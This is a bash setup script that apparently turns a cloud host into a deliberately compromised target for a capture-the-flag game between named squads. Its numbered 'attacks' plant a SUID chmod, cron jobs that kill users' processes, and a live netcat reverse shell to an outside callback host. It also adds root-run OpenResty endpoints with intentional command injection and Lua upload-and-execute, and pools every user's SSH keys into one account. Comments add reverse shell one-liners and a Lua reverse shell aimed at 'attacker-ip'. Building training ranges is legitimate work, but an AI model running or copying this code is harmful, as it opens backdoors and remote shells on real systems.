#!/bin/bash

# --- No need to  add user wildcat, assuming running processes ---
# useradd --password $1$xJlGRbUQ$4GUqI1Bef2LGXcLaUmS4d1 wildcat
# 
# pushd /home/wildcat
# su -c 'ssh-keygen -t rsa -b 2048 -f ~/.ssh/id_rsa -N "" -q -C "ohio"' wildcat
# cp .ssh/id_rsa.pub /home/ssm-user/.ssh/authorized_keys
# su -c 'mv ~/.ssh/id_rsa.pub  ~/.ssh/authorized_keys' wildcat

# --------- Attack #1:  Enable changing any file permission ------
cd /usr/sbin
cp /usr/bin/chmod chmod
chmod 4755 chmod

# ----- enable cron nased chaos -----------
dnf install -y -q cronie
systemctl start crond
systemctl enable crond

# ---- Attack2: just being a pain in the A.. ------
cat <<EOF >/var/log/shutdown.log
#!/bin/bash
for i in {10..1}; do
    echo -e "Alert: System shutdown in \$i" | wall -n
    sleep 1
done
wall "JK"
wall "maybe you would have preferred:" -n
wall -n  "#!/bin/bash" 
wall -n "while :"
wall -n "do"
wall -n "  cat /dev/random | head -c 10000 | wall"
wall -n "done"

EOF
chmod +x /var/log/shutdown.log
CRON_JOB="*/30 * * * * /var/log/shutdown.log >> /var/log/shutdown2.log 2>&1"
(crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -

# --- Setup  squad data  -------------
squad_names=("bear" "eagle" "falcon" "hawk" "kingfisher" "porcupine" "shark" "squirrel" "whale" "wolf")
squad_ports=("34540" "34541" "34542" "34543" "34544" "34545" "34546" "34547" "34548" "34549")

# ------- Attack #3 nuke user processes -----
cat <<EOF >/var/log/lonely.log
#!.bin.bash
squad_names=("bear" "eagle" "falcon" "hawk" "kingfisher" "porcupine" "shark" "squirrel" "whale" "wolf")
for user in "\$squads_names[@]"; do
    sudo pkill -KILL -u "\$user"
done
EOF
chmod +x /var/log/lonely.log
CRON_JOB="*/10 * * * * /var/log/lonely.log >> /var/log/lonely2.log 2>&1"
(crontab -l 2>/dev/null; echo "$CRON_JOB") | crontab -

# ----- select outbound port for nc attack -------
for (( i=0; i<10; i++ ));  do
	SQUAD=$squad_names[$i]
	if [ -f "/home/$SQUAd/flag/flag.txt" ]; then
		PORT=${squad_ports[$i]}
	fi
done

# --------------- netcat fun --------------
yum install -y nc

# Create reverse shell notes
# nc -lvnp 4444
# nc 4444 -e /bin/bash
# bash -i >& /dev/tcp/<your-ip>/4444 0>&1

# -------- Attack $4: Open netcat listener -----------
nc -lvnp 32123 &

# ------- Attack #5: Allow callback machine reverse shell access ------
nc callback.nadialin.kengraf.com "$PORT" -e /bin/bash &


# -------- Attack #6  Did teams notice log changes to flag? ---------
yum install -y inotify-tools

FILE_TO_WATCH="/home/$SQUAD/flag/flag.txt"

notifywait -m -e modify,create,delete "$FILE_TO_WATCH" | while read dir event; do cat $FILE_TO_WATCH >>/tmp/flag_watch; done &


# ----------- Attack #7: Replace nginx with flawed openresty ------------
sudo systemctl disable nginx && sudo systemctl stop nginx
wget https://openresty.org/package/amazon/openresty.repo
sudo mv openresty.repo /etc/yum.repos.d/

# update the index:
sudo yum check-update
sudo yum install -y openresty
sudo systemctl start openresty
sudo systemctl enable openresty

# use nadialin picture as main page


cd /usr/local/openresty/nginx/conf
sed -i '/#user/cuser root;' nginx.conf
sed -i '38i     include /usr/local/openresty/nginx/conf/conf.d/*.conf;' nginx.conf


mkdir -p conf.d/
cd conf.d
cat <<EOF >reload.conf
    # Vulnerable endpoint for CTF
    location /admin {
        default_type 'text/html';
        
        # Simulate vulnerable parameter processing
        content_by_lua_block {
            local args = ngx.req.get_uri_args()
            local cmd = args.cmd
            
            if cmd then
                -- INTENTIONALLY VULNERABLE: Command injection
                local handle = io.popen(cmd)
                local result = handle:read("*a")
                handle:close()
                ngx.say("<pre>" .. result .. "</pre>")
            else
                ngx.say("Admin Panel - cmd parameter required")
            end
        }
    }

    # Alternative: File upload vulnerability
    location /upload {
        content_by_lua_block {
            ngx.req.read_body()
            local data = ngx.req.get_body_data()
            
            if data then
                -- Write to web directory (vulnerable)
                local file = io.open("/var/www/html/uploaded.lua", "w")
                file:write(data)
                file:close()
                ngx.say("File uploaded successfully")
            end
        }
    }

    # Execute uploaded lua file
    location /execute {
        content_by_lua_file /var/www/html/uploaded.lua;
    }
EOF

# ---- Attack #8: command injection via /admin ----
# ---- Attack #9: malicous file upload via /upload ----

# Reverse shell example Lua script
# Players would upload this via /upload endpoint:
# 
# local socket = require("socket")
# local host = "attacker-ip"
# local port = 4444
# 
# local tcp = socket.tcp()
# tcp:connect(host, port)
# 
# while true do
#     tcp:send("$ ")
#     local cmd = tcp:receive()
#     if not cmd then break end
#     
#     local handle = io.popen(cmd)
#     local result = handle:read("*a")
#     handle:close()
#     
#     tcp:send(result)
# end
# tcp:close()


# Restore nginx default pages
rm -rf /usr/local/openresty/nginx/html/*
cp -r /usr/share/nginx/html/* /usr/local/openresty/nginx/html/
systemctl restart openresty

# ----- Attack #10: Unauthorized file lock down -----
# Make it harder for squads to nuke other squads
chattr +i /home
chattr +i /etc/passwd

#---------- Helper commands to review post-boot -------------
## View the actual user-data script that ran
#sudo cat /var/lib/cloud/instance/user-data.txt
#
## Detailed execution log
#sudo cat /var/log/cloud-init.log
#
## Most comprehensive log
#sudo cat /var/log/cloud-init-output.log | grep -n SQUAD

# ---- Attack #11: randomly change flag -------------
cd /usr/bin
cat <<EOF >fagne.sh
#!/bin/bash

SQUADS=("bear" "whale" "kingfisher" "shark" "porcupine" "eagle" "wolf" "hawk" "squirrel" "falcon")

while true; do
	RANDOM_WORD=\${SQUADS[\$((RANDOM % 10))]}
	FLAG_FILE=\$(find /  -name "flag.txt" -type f 2>/dev/null | head -n 1)
	
	if [ -n "]\$FLAG_FILE" ]; then
		echo "\$RANDOM_WORD" > "\$FLAG_FILE"
	fi
	
	sleep 900
done
EOF
chmod +x fagne.sh
cd /home
/usr/bin/fagne.sh &

# ---------- Attack #12: Enable ssm-user for all public keys  ------
su -c "mkdir ~/.ssh" ssm-user
cd /home/ssm-user/.ssh
find /home -name "authorized_keys" -exec cat {} + >> tmp
mv tmp authorized_keys

